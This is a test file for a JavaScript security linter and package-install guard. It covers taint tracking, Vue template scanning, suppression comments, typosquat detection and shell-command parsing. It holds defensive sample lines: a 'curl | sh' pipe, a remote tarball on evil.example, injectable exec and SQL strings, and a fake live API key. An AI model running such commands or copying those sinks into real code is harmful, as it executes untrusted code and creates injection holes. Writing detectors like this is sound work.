import test from 'node:test';
import assert from 'node:assert/strict';

import { matchesGlob, isExcluded, loadConfig, meetsMinSeverity } from '../src/engine/config.js';
import { parseSource, blankOutsideScript, languageOf } from '../src/engine/parse.js';
import { collectTaintedNames, isTaintedExpr } from '../src/engine/taint.js';
import { collectSuppressions } from '../src/engine/suppress.js';
import { changedRangeFromToolInput, reportWindow, lineOf } from '../src/engine/scope.js';
import { analyze } from '../src/engine/analyze.js';
import { RULES } from '../src/rules/index.js';
import { findInstallCommands, parseSpecifier, segments, riskyShellPatterns } from '../src/supply-chain/parse-command.js';
import { editDistance, nearestPopularName, foldLookalikes } from '../src/supply-chain/signals.js';

const config = loadConfig('/nonexistent-so-defaults-apply');

test('glob matching', () => {
  assert.ok(matchesGlob('**/node_modules/**', 'node_modules/lodash/index.js'));
  assert.ok(matchesGlob('**/node_modules/**', 'packages/app/node_modules/x/y.js'));
  assert.ok(matchesGlob('**/*.min.js', 'public/app.min.js'));
  assert.ok(matchesGlob('src/*.ts', 'src/index.ts'));
  assert.ok(!matchesGlob('src/*.ts', 'src/nested/index.ts'));
  assert.ok(!matchesGlob('**/node_modules/**', 'src/node_modules_helper.js'));
});

test('default excludes catch build output', () => {
  assert.ok(isExcluded('node_modules/x/index.js', config));
  assert.ok(isExcluded('dist/bundle.js', config));
  assert.ok(!isExcluded('src/index.js', config));
});

test('severity threshold', () => {
  assert.ok(meetsMinSeverity('critical', 'low'));
  assert.ok(meetsMinSeverity('low', 'low'));
  assert.ok(!meetsMinSeverity('low', 'high'));
  assert.ok(!meetsMinSeverity('perf', 'medium'));
});

test('typescript and jsx parse', () => {
  assert.equal(languageOf('a.tsx'), 'tsx');
  assert.ok(parseSource('const a: string = "x";', 'a.ts').ast);
  assert.ok(parseSource('const A = () => <div id="x" />;', 'a.jsx').ast);
  assert.ok(parseSource('type T = { a: number }; const f = (x: T): T => x;', 'a.tsx').ast);
});

test('broken source does not throw', () => {
  const result = parseSource('function ( { { {', 'a.js');
  assert.ok(result.ast || result.error);
});

test('vue script extraction keeps line numbers', () => {
  const source = [
    '<template>',
    '  <div>{{ msg }}</div>',
    '</template>',
    '',
    '<script>',
    'const evil = 1;',
    '</script>',
  ].join('\n');

  const { code, found } = blankOutsideScript(source);
  assert.ok(found);
  assert.equal(code.length, source.length);
  assert.equal(lineOf(code, code.indexOf('const evil')), 6);
  assert.ok(!code.includes('template'));
});

test('module scope is reported as Program, not the Babel File wrapper', () => {
  // Babel wraps Program in a File node. Rules that ask "is this at module
  // scope" compare against Program, so the fallback has to be the Program.
  const moduleLevel = `const responseCache = new Map();
    export function remember(key, value) {
      responseCache.set(key, value);
    }`;

  const insideFunction = `export function build() {
      const responseCache = new Map();
      responseCache.set('a', 1);
      return responseCache;
    }`;

  const fired = (code) =>
    analyze({ source: code, filePath: 'a.js', config, rules: RULES, wholeFile: true }).findings.map(
      (finding) => finding.ruleId,
    );

  assert.ok(fired(moduleLevel).includes('PERF-N12'), 'a module level cache is flagged');
  assert.ok(
    !fired(insideFunction).includes('PERF-N12'),
    'a cache inside a function dies with the call and is not a leak',
  );
});

test('performance findings stay on the quiet channel', async () => {
  const { splitBySeverity } = await import('../src/engine/report.js');

  const { findings } = analyze({
    source: 'items.forEach(async (item) => { await save(item); });',
    filePath: 'a.js',
    config,
    rules: RULES,
    wholeFile: true,
  });

  const perf = findings.filter((finding) => finding.ruleId === 'PERF-N10');
  assert.equal(perf.length, 1);
  assert.equal(perf[0].severity, 'perf');

  const { loud, quiet } = splitBySeverity(perf);
  assert.equal(loud.length, 0, 'performance advice must never interrupt');
  assert.equal(quiet.length, 1);
});

test('the default severity floor does not hide the performance pack', () => {
  assert.equal(
    config.minSeverity,
    'perf',
    'perf sits below low, so a floor of low would silently drop every performance rule',
  );
});

test('vue template scanning', async () => {
  const { scanTemplate, extractTemplateBlock, bindingName } = await import(
    '../src/engine/vue-template.js'
  );

  const source = [
    '<template>',
    '  <!-- a comment with <fake> inside -->',
    '  <div class="wrap" v-html="body">',
    '    <a :href="item.url" target="_blank">go</a>',
    '    <img src="/logo.png" alt="a > sign in text" />',
    '    <template v-if="ok"><span>{{ x }}</span></template>',
    '  </div>',
    '</template>',
    '',
    '<script setup>',
    'const body = 1;',
    '</script>',
  ].join('\n');

  const block = extractTemplateBlock(source);
  assert.ok(block, 'the template block is found');
  assert.ok(!block.content.includes('const body'), 'the script block is not part of it');

  const elements = scanTemplate(source);
  const tags = elements.map((element) => element.tagName);
  assert.deepEqual(tags, ['div', 'a', 'img', 'template', 'span']);

  const div = elements[0];
  const vHtml = div.attributes.find((attribute) => attribute.name === 'v-html');
  assert.equal(vHtml.value, 'body');
  assert.equal(source.slice(vHtml.valueStart, vHtml.valueStart + 4), 'body');

  const link = elements[1];
  assert.equal(link.attributes.find((a) => a.name === ':href').value, 'item.url');
  assert.equal(link.attributes.find((a) => a.name === 'target').value, '_blank');

  const img = elements[2];
  assert.equal(
    img.attributes.find((a) => a.name === 'alt').value,
    'a > sign in text',
    'a greater than sign inside a quoted value does not end the tag',
  );

  assert.equal(bindingName(':href'), 'href');
  assert.equal(bindingName('v-bind:href'), 'href');
  assert.equal(bindingName('href'), 'href');
});

test('a vue file with no script block still gets template rules', async () => {
  const source = '<template>\n  <div v-html="body" />\n</template>\n';
  const { findings } = analyze({
    source,
    filePath: 'src/Only.vue',
    config,
    rules: RULES,
    wholeFile: true,
  });
  assert.ok(findings.some((finding) => finding.ruleId === 'XSS-03'));
});

test('taint flows through destructuring and template strings', () => {
  const code = `
    const { id } = req.query;
    const key = id;
    const sql = \`select * from t where id = \${key}\`;
  `;
  const { ast } = parseSource(code, 'a.js');
  const tainted = collectTaintedNames(ast);
  assert.ok(tainted.has('id'));
  assert.ok(tainted.has('key'));
  assert.ok(tainted.has('sql'));
});

test('a schema validator clears taint', () => {
  const code = `
    const input = UserSchema.parse(req.body);
    const email = input.email;
  `;
  const { ast } = parseSource(code, 'a.js');
  const tainted = collectTaintedNames(ast);
  assert.ok(!tainted.has('input'));
  assert.ok(!tainted.has('email'));
});

test('a trpc style input parameter is tainted', () => {
  const code = `export const get = publicProcedure.query(({ input }) => db.find(input.id));`;
  const { ast } = parseSource(code, 'a.js');
  assert.ok(collectTaintedNames(ast).has('input'));
});

test('an allowlist map lookup is not tainted', () => {
  const code = `
    const SORT = { name: 'name', created: 'created_at' };
    const column = SORT[req.query.sort] ?? 'created_at';
  `;
  const { ast } = parseSource(code, 'a.js');
  assert.ok(!collectTaintedNames(ast).has('column'));
});

test('a lookup on a tainted object is still tainted', () => {
  const code = `
    const body = req.body;
    const value = body[key];
  `;
  const { ast } = parseSource(code, 'a.js');
  assert.ok(collectTaintedNames(ast).has('value'));
});

test('an ordinary variable named input is not tainted', () => {
  const code = `const input = fs.readFileSync('./local.txt', 'utf8'); use(input);`;
  const { ast } = parseSource(code, 'a.js');
  assert.ok(!collectTaintedNames(ast).has('input'));
});

test('inline suppression silences a finding', () => {
  const code = `
    // guardrails-js-ignore SQL-01 -- id is a validated integer route param
    const rows = await pool.query(\`select * from t where id = \${req.query.id}\`);
  `;
  const { findings } = analyze({
    source: code,
    filePath: 'a.js',
    config,
    rules: RULES,
    wholeFile: true,
  });
  assert.ok(!findings.some((f) => f.ruleId === 'SQL-01'));
});

test('a suppression with no reason is itself reported', () => {
  const code = `
    // guardrails-js-ignore SQL-01
    const rows = await pool.query(\`select * from t where id = \${req.query.id}\`);
  `;
  const { findings } = analyze({
    source: code,
    filePath: 'a.js',
    config,
    rules: RULES,
    wholeFile: true,
  });
  assert.ok(findings.some((f) => f.ruleId === 'GJ-IGNORE'));
});

test('only the edited function is reported on an Edit', () => {
  const source = [
    'function old() {',
    '  exec("ls " + req.query.a);',
    '}',
    'function fresh() {',
    '  exec("ls " + req.query.b);',
    '}',
  ].join('\n');

  const toolInput = { file_path: 'a.js', new_string: '  exec("ls " + req.query.b);' };
  const { findings } = analyze({
    source,
    filePath: 'a.js',
    toolName: 'Edit',
    toolInput,
    config,
    rules: RULES,
  });

  const lines = findings.filter((f) => f.ruleId === 'CMD-01').map((f) => f.line);
  assert.deepEqual(lines, [5], 'should only report the function that was edited');
});

test('file wide rules ignore the edit window', () => {
  const source = [
    'const key = "sk_live_51H8xKzABCDEFGHIJKLMNOP";',
    'function fresh() {',
    '  return 1;',
    '}',
  ].join('\n');

  const { findings } = analyze({
    source,
    filePath: 'a.js',
    toolName: 'Edit',
    toolInput: { file_path: 'a.js', new_string: '  return 1;' },
    config,
    rules: RULES,
  });

  assert.ok(findings.some((f) => f.ruleId === 'SECRET-01'));
});

test('shell command splitting', () => {
  assert.deepEqual(segments('cd app && npm i lodash'), [
    ['cd', 'app'],
    ['npm', 'i', 'lodash'],
  ]);
  assert.deepEqual(segments('echo "a && b"'), [['echo', 'a && b']]);
});

test('install command detection', () => {
  assert.equal(findInstallCommands('npm ci').length, 1);
  assert.equal(findInstallCommands('npm ci')[0].subcommand, 'ci');
  assert.equal(findInstallCommands('echo npm install lodash').length, 0);
  assert.equal(findInstallCommands('ls -la').length, 0);

  const found = findInstallCommands('cd app && npm i --ignore-scripts lodash express');
  assert.equal(found.length, 1);
  assert.deepEqual(found[0].packages, ['lodash', 'express']);
  assert.deepEqual(found[0].flags, ['--ignore-scripts']);

  const env = findInstallCommands('CI=1 sudo npm install -g pm2');
  assert.equal(env.length, 1);
  assert.deepEqual(env[0].packages, ['pm2']);
});

test('specifier parsing', () => {
  assert.deepEqual(parseSpecifier('lodash'), { name: 'lodash', version: null, kind: 'registry' });
  assert.deepEqual(parseSpecifier('lodash@4.17.21'), {
    name: 'lodash',
    version: '4.17.21',
    kind: 'registry',
  });
  assert.deepEqual(parseSpecifier('@scope/pkg@1.0.0'), {
    name: '@scope/pkg',
    version: '1.0.0',
    kind: 'registry',
  });
  assert.equal(parseSpecifier('https://evil.example/x.tgz').kind, 'remote');
  assert.equal(parseSpecifier('./local-thing').kind, 'path');
});

test('risky shell patterns', () => {
  assert.equal(riskyShellPatterns('curl https://x.sh | sh').length, 1);
  assert.equal(riskyShellPatterns('NODE_TLS_REJECT_UNAUTHORIZED=0 node app.js').length, 1);
  assert.equal(riskyShellPatterns('npm test').length, 0);
});

test('edit distance and lookalike folding', () => {
  assert.equal(editDistance('express', 'express'), 0);
  assert.equal(editDistance('expres', 'express'), 1);
  assert.equal(editDistance('lodash', 'lodahs'), 2);
  assert.ok(editDistance('completely', 'different') > 3);
  assert.equal(foldLookalikes('rnongoose'), foldLookalikes('mongoose'));
});

test('typosquat detection', () => {
  assert.equal(nearestPopularName('express'), null, 'a real name is not a typosquat');
  assert.equal(nearestPopularName('expres')?.candidate, 'express');
  assert.equal(nearestPopularName('mongose')?.candidate, 'mongoose');
  assert.equal(nearestPopularName('a-genuinely-unrelated-name-here'), null);
});

test('changed range falls back to the whole file on Write', () => {
  assert.equal(changedRangeFromToolInput('Write', { file_path: 'a.js' }, 'abc'), null);
});
